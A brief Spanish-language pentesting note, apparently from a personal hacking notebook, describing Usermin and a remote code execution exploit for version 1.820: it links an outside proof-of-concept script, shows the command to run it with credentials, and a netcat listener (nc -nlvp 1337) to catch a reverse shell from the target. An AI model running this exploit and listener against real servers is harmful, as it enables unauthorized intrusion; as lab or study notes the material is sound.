# Usermin 

Tags: #Linux #Usermin 

Usermin es una interfaz web de administración para usuarios de sistemas Linux/Unix, desarrollada por los creadores de Webmin. Permite que un usuario gestione determinadas funciones de su cuenta desde el navegador, sin tener que administrar todo el servidor.
## Version 1.820 - RCE 
* [PoC RCE](https://gist.github.com/numanturle/5a6fc1ebc3b267e6480544e9c1f4cfe5)
```bash 
❯ python3 usermin.py -u IP -l user -p Password123! 

NOTA:
	- El script ya te pone el 'https://' y el puerto '20000'
	- Antes de ejecutar ponerse en escucha 
	- A veces funciona si te sales de la sessión web 
	- Poner la IP de Kali en el  script 

❯ nc -nlvp 1337   
```